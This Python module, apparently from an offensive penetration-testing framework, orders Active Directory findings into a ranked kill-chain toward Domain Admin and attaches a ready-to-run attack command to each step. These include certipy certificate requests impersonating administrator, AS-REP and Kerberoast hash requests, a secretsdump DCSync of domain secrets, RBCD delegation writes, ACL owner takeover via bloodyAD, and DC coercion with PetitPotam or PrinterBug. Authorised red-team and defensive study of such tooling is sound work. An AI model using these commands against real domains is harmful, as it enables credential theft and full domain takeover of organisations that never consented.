"""AD kill-chain composer — order the AD findings into a path to Domain Admin.

BloodHound/ADCS/roasting parsers each emit *isolated* findings ("X is
kerberoastable", "ESC1 on template Y", "GenericAll over Z"). What an operator
actually wants is the *order*: which of these, given what we already hold, gets to
Domain Admin fastest and with least noise. This module ranks the findings into an
ordered kill-chain — highest-leverage primitive first — and attaches the concrete
next command for each step.

Pure function over the finding list (no I/O). It reads finding *titles* (the stable
contract the AD parsers already produce) plus a couple of flags about what we hold,
so it composes cleanly on top of `bloodhound.py`, `adcs.py`, and `creds`.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..core.state import Finding

# Lower rank = do first. Each technique maps to how directly it reaches DA.
_RANK = {
    "dcsync": 10,
    "adcs-esc": 20,
    "unconstrained-deleg": 30,
    "rbcd": 40,
    "asrep-roast": 50,       # no creds needed -> cheap early win
    "kerberoast": 60,        # needs any domain creds
    "acl-abuse": 70,
}


@dataclass
class ChainStep:
    rank: int
    technique: str
    target: str
    why: str
    command: str
    needs_creds: bool = False


@dataclass
class AdChain:
    steps: list[ChainStep] = field(default_factory=list)

    def ordered(self) -> list[ChainStep]:
        # Stable sort by rank, preserving discovery order within a rank.
        return sorted(self.steps, key=lambda s: s.rank)


_ESC_TITLE = re.compile(r"ADCS (ESC\d{1,2}) on template (.+)", re.IGNORECASE)
_KERB_TITLE = re.compile(r"Kerberoastable account:\s*(.+)", re.IGNORECASE)
_ASREP_TITLE = re.compile(r"AS-REP roastable account:\s*(.+)", re.IGNORECASE)
_UNCON_TITLE = re.compile(r"Unconstrained delegation:\s*(.+)", re.IGNORECASE)
_ACL_TITLE = re.compile(r"ACL:\s*(\w+)\s+over\s+(.+)", re.IGNORECASE)
_DANGLE_TITLE = re.compile(r"Dangling ADCS template reference:\s*(.+)", re.IGNORECASE)

# ACL rights that (over a domain object) are a direct DCSync grant.
_DCSYNC_RIGHTS = {"allextendedrights", "getchanges", "getchangesall", "dcsync"}
# ACL rights that take over a computer object -> RBCD to local admin.
_RBCD_RIGHTS = {"genericwrite", "genericall", "writeaccountrestrictions"}


def plan_ad_chain(findings: list[Finding], *, have_creds: bool = False) -> AdChain:
    """Compose the ordered AD kill-chain from the current findings.

    ``have_creds`` says whether we already hold any valid domain credential (some
    steps, e.g. Kerberoast, need one to fire; AS-REP roast does not).
    """
    chain = AdChain()
    for f in findings:
        title = f.title or ""

        m = _ESC_TITLE.search(title)
        if m:
            esc, tmpl = m.group(1).upper(), m.group(2).strip()
            chain.steps.append(ChainStep(
                _RANK["adcs-esc"], esc, tmpl,
                f"{esc} lets a domain user enroll a cert that authenticates as DA.",
                f.exploit or f"certipy req -ca <CA> -template {tmpl} "
                             "-upn administrator@<domain>",
                needs_creds=True))
            continue

        m = _DANGLE_TITLE.search(title)
        if m:
            chain.steps.append(ChainStep(
                _RANK["adcs-esc"] + 1, "ADCS-DANGLING", m.group(1).strip(),
                "Dangling template the CA still publishes — recreate/own it as ESC1.",
                f.exploit or "recreate the template object as ESC1, then certipy req",
                needs_creds=True))
            continue

        m = _UNCON_TITLE.search(title)
        if m:
            chain.steps.append(ChainStep(
                _RANK["unconstrained-deleg"], "UNCONSTRAINED", m.group(1).strip(),
                "Coerce a DC to auth here, capture its TGT -> DCSync the domain.",
                f.exploit or "coerce with petitpotam/printerbug, then export the TGT"))
            continue

        m = _ASREP_TITLE.search(title)
        if m:
            chain.steps.append(ChainStep(
                _RANK["asrep-roast"], "AS-REP-ROAST", m.group(1).strip(),
                "No pre-auth required — roast without any credential, crack offline.",
                f.exploit or "impacket-GetNPUsers <domain>/ -usersfile users.txt "
                             "-no-pass -dc-ip <dc>"))
            continue

        m = _KERB_TITLE.search(title)
        if m:
            chain.steps.append(ChainStep(
                _RANK["kerberoast"], "KERBEROAST", m.group(1).strip(),
                "Request the SPN's TGS and crack it offline (needs any domain creds).",
                f.exploit or "impacket-GetUserSPNs <domain>/<user>:<pass> -request "
                             "-dc-ip <dc>",
                needs_creds=True))
            continue

        m = _ACL_TITLE.search(title)
        if m:
            right, target = m.group(1).lower(), m.group(2).strip()
            if right in _DCSYNC_RIGHTS:
                chain.steps.append(ChainStep(
                    _RANK["dcsync"], "DCSYNC", target,
                    f"{right} over the domain == replicate secrets: instant DA.",
                    f.exploit or "impacket-secretsdump <domain>/<you>:<pass>@<dc> "
                                 "-just-dc",
                    needs_creds=True))
            elif right in _RBCD_RIGHTS and _looks_like_computer(target):
                chain.steps.append(ChainStep(
                    _RANK["rbcd"], "RBCD", target,
                    f"{right} over a computer -> set RBCD, get a local-admin ST.",
                    f.exploit or "rbcd.py -delegate-to <target$> -delegate-from "
                                 "<owned$> -action write <domain>/<you>:<pass>",
                    needs_creds=True))
            else:
                chain.steps.append(ChainStep(
                    _RANK["acl-abuse"], f"ACL-{right.upper()}", target,
                    f"{right} over {target}: abuse via shadow-cred / targeted "
                    "kerberoast / password reset.",
                    f.exploit or f"bloodyAD --host <dc> -d <domain> -u <you> -p <pass> "
                                 f"set owner {target} <you>",
                    needs_creds=True))
    return chain


def _looks_like_computer(name: str) -> bool:
    """A computer-account target (for RBCD), not a user/group/domain.

    Computer accounts show up as a SAM name ending ``$`` or an FQDN host
    (``web01.corp.local``, 2+ dots). A UPN (``jdoe@corp.local``) or a bare domain
    (``corp.local``, one dot) is not a computer, so RBCD does not apply.
    """
    n = name.strip()
    if n.endswith("$"):
        return True
    if "@" in n:                    # UPN user / group@domain
        return False
    return n.count(".") >= 2        # FQDN host, not a 2-label domain


def render_chain(chain: AdChain, *, have_creds: bool = False) -> list[str]:
    """Human-readable, ordered kill-chain lines (for the CLI)."""
    lines: list[str] = []
    steps = chain.ordered()
    if not steps:
        return ["adchain: no AD attack primitives in the current findings."]
    for i, s in enumerate(steps, 1):
        gate = ""
        if s.needs_creds and not have_creds:
            gate = "  [needs a domain credential first]"
        lines.append(f"{i}. [{s.technique}] {s.target} — {s.why}{gate}")
        lines.append(f"     $ {s.command}")
    return lines
